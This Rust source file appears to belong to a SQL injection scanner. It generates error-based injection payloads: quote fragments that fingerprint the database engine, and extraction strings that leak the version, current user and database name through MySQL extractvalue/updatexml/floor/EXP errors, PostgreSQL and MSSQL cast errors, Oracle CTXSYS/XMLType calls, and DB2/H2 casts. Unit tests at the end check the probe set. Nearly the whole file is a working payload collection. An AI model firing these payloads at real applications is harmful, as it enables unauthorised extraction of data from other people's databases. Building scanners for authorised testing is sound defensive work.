//! Error-based SQL injection generators.
//!
//! Two families:
//!  1. *Fingerprint* probes — malformed fragments that make each DBMS emit a
//!     dialect-specific parser error, used to identify the backend.
//!  2. *Extraction* probes — the advanced technique: coerce the DBMS into
//!     leaking query results **inside an error message** (extractvalue,
//!     updatexml, double-query/floor, CAST/CONVERT type confusion, Oracle
//!     XMLType/CTXSYS). These carry a recognizable `~` delimiter so the leaked
//!     value is trivial to locate in the response.
//!
//! No trivial `1=1` tautologies live here — every extraction probe pulls a
//! real value (`version()`, `user()`, `database()`) back through the error
//! channel.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

/// Delimiter wrapped around leaked values so they stand out in error text.
pub const LEAK_DELIM: &str = "~";

fn probe(
    name: &str,
    payload: &str,
    dbms: Option<DbmsFamily>,
    clause: Option<SqlClause>,
) -> GeneratedPayload {
    GeneratedPayload {
        name: name.to_string(),
        probe_type: ProbeType::ErrorInjection,
        payload_str: payload.to_string(),
        expected_dbms: dbms,
        clause,
    }
}

pub fn generate() -> Vec<GeneratedPayload> {
    let mut out = Vec::new();
    out.extend(fingerprint_probes());
    out.extend(extraction_probes());
    out
}

/// Malformed fragments that provoke dialect-specific parser errors.
fn fingerprint_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        probe("error-unbalanced-quote", "'", None, None),
        probe("error-double-quote-garbage", "\"'", None, None),
        // MySQL/MariaDB tolerate `\'`; PG/MSSQL/Oracle reject the escape.
        probe("error-backslash-escape", "\\'", Some(MySQL), None),
        // `||` concatenation errors on MySQL, parses on PG/Oracle/SQLite.
        probe("error-pipe-concat", "'||'", Some(PostgreSQL), Some(SqlClause::StringConcat)),
        probe("error-open-paren", "')", None, None),
        probe("error-comment-truncate", "'-- -", None, Some(SqlClause::Comment)),
    ]
}

/// Advanced error-based extraction: leak a real value through the error text.
fn extraction_probes() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    vec![
        // --- MySQL / MariaDB -------------------------------------------------
        // extractvalue(): XPATH syntax error echoes the second argument.
        probe(
            "err-mysql-extractvalue",
            "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // updatexml(): same XPATH leak, different sink.
        probe(
            "err-mysql-updatexml",
            "' AND updatexml(1,concat(0x7e,(SELECT current_user()),0x7e),1)-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // Double-query / floor(rand) group-by collision — the classic that
        // works when extractvalue/updatexml are unavailable (older MySQL).
        probe(
            "err-mysql-double-query",
            "' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT version()),0x7e,floor(rand(0)*2))x \
             FROM information_schema.tables GROUP BY x)a)-- -",
            Some(MySQL),
            Some(SqlClause::GroupBy),
        ),
        // EXP() overflow leak (MySQL >= 5.5.5).
        probe(
            "err-mysql-exp-overflow",
            "' AND EXP(~(SELECT * FROM(SELECT concat(0x7e,(SELECT user()),0x7e))x))-- -",
            Some(MySQL),
            Some(SqlClause::Subquery),
        ),
        // --- PostgreSQL ------------------------------------------------------
        // CAST text->int: "invalid input syntax for integer: <value>".
        probe(
            "err-pg-cast-int",
            "' AND 1=CAST((SELECT version()) AS int)-- -",
            Some(PostgreSQL),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-pg-cast-numeric",
            "' AND 1=CAST((SELECT current_database()) AS numeric)-- -",
            Some(PostgreSQL),
            Some(SqlClause::Cast),
        ),
        // --- MSSQL -----------------------------------------------------------
        // CONVERT int: "Conversion failed when converting the ... value <v>".
        probe(
            "err-mssql-convert",
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            Some(MSSQL),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-mssql-db-name",
            "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
            Some(MSSQL),
            Some(SqlClause::Cast),
        ),
        // --- Oracle ----------------------------------------------------------
        // CTXSYS.DRITHSX.SN raises ORA-20000 echoing its argument.
        probe(
            "err-oracle-ctxsys",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -",
            Some(Oracle),
            Some(SqlClause::Subquery),
        ),
        // XMLType wraps the value in an "LPX-00XXX" / ORA error.
        probe(
            "err-oracle-xmltype",
            "' AND 1=(SELECT UPPER(XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62))) \
             FROM dual)-- -",
            Some(Oracle),
            Some(SqlClause::Subquery),
        ),
        // --- DB2 / H2 --------------------------------------------------------
        probe(
            "err-db2-cast",
            "' AND 1=(SELECT CAST((VALUES(1)) AS int) FROM sysibm.sysdummy1 \
             WHERE 1=CAST((SELECT service_level FROM sysibmadm.env_inst_info) AS int))-- -",
            Some(DB2),
            Some(SqlClause::Cast),
        ),
        probe(
            "err-h2-cast",
            "' AND 1=CAST((SELECT H2VERSION()) AS int)-- -",
            Some(H2),
            Some(SqlClause::Cast),
        ),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn emits_fingerprint_and_extraction() {
        let all = generate();
        assert!(all.len() >= 14, "expected a broad probe set, got {}", all.len());
        assert!(all.iter().all(|p| p.probe_type == ProbeType::ErrorInjection));
    }

    #[test]
    fn no_trivial_tautologies() {
        for p in generate() {
            let s = p.payload_str.replace(' ', "");
            assert!(!s.contains("1=1"), "trivial tautology leaked in: {}", p.payload_str);
            assert!(!s.contains("or1=1"), "trivial OR tautology in: {}", p.payload_str);
        }
    }

    #[test]
    fn extraction_probes_pull_real_values() {
        // Every extraction probe references a concrete info function, not a
        // constant, and every DBMS family that has one is represented.
        let ex = extraction_probes();
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::MySQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::PostgreSQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::MSSQL)));
        assert!(ex.iter().any(|p| p.expected_dbms == Some(DbmsFamily::Oracle)));
        for p in ex {
            assert!(
                p.payload_str.contains("SELECT"),
                "extraction probe should embed a subquery: {}",
                p.payload_str
            );
        }
    }
}

